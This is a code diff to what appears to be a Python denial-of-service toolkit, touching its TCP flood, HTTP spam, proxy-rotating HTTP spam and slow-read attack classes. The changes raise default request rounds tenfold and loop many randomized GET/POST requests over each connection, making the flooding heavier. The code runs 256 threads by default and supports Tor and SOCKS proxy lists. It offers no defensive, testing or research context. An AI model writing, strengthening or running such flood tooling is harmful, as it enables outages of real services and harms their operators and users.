@@ -264,7 +264,7 @@ class vse_flood:
 
 
 class tcp_flood:
- def __init__(self,u,p=80,threads_daemon=True,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,threads_daemon=True,min_size=10,max_size=50,threads=256,timeout=5,round_min=50,round_max=150,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.stop=False
   self.counter=0
@@ -360,7 +360,7 @@ class tcp_flood:
 
 
 class http_spam:
- def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=50,round_max=150,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.cookie=cookie
   self.user_agents=user_agents
@@ -404,16 +404,17 @@ class http_spam:
      s.connect((self.target,self.port))
      if ((self.port==443) or (self.port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-     if self.method==3:
-      ty=random.randint(1,2)
-     else:
-      ty=self.method
-     if ty==1:
-      req="GET"
-     else:
-      req="POST"
-     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max,self.cookie,self.user_agents)
-     try:
+     for l in range(random.randint(self.round_min,self.round_max)):
+      if self.method==3:
+       ty=random.randint(1,2)
+      else:
+       ty=self.method
+      if ty==1:
+       req="GET"
+      else:
+       req="POST"
+      m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max,self.cookie,self.user_agents)
+      try:
        if self.stop==True:
          break
        s.send(m.encode('utf-8'))
@@ -422,9 +423,9 @@ class http_spam:
         sys.stdout.write("\rRequest: {} | Type: {} | Bytes: {}   ".format(self.counter,req,len(m)))
         sys.stdout.flush()
         #print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
-     except:
+      except:
        break
-     time.sleep(self.interval)
+      time.sleep(self.interval)
      s.close()
     except:
      pass
@@ -452,7 +453,7 @@ class http_spam:
 
 
 class prox_http_spam:
- def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=50,round_max=150,interval=0.001,duration=60,logs=False):
   self.logs=logs
   self.cookie=cookie
   self.user_agents=user_agents
@@ -525,16 +526,17 @@ class prox_http_spam:
      s.connect((self.target,self.port))
      if ((self.port==443) or (self.port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-     if self.method==3:
-      ty=random.randint(1,2)
-     else:
-      ty=self.method
-     if ty==1:
-      req="GET"
-     else:
-      req="POST"
-     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max,self.cookie,self.user_agents)
-     try:
+     for l in range(random.randint(self.round_min,self.round_max)):
+      if self.method==3:
+       ty=random.randint(1,2)
+      else:
+       ty=self.method
+      if ty==1:
+       req="GET"
+      else:
+       req="POST"
+      m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max,self.cookie,self.user_agents)
+      try:
        if stop==True:
          break
        s.send(m.encode('utf-8'))
@@ -543,9 +545,9 @@ class prox_http_spam:
         sys.stdout.write("\rBot: {} | Request: {} | Type: {} | Bytes: {}   ".format(ipp,self.counter,req,len(m)))
         sys.stdout.flush()
         #print("Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
-     except:
+      except:
        break
-     time.sleep(self.interval)
+      time.sleep(self.interval)
      s.close()
     except:
      pass
@@ -1028,7 +1030,7 @@ class slow_read:
          sys.stdout.write("\rReceived: {}   ".format(str(d.decode('utf-8').strip())))
          sys.stdout.flush()
          #print("Received: {}".format(str(d.decode('utf-8'))))
-        time.sleep(random.randint(self.min_speed,self.max_speed))
+       time.sleep(random.randint(self.min_speed,self.max_speed))
       except:
        break
      s.close()
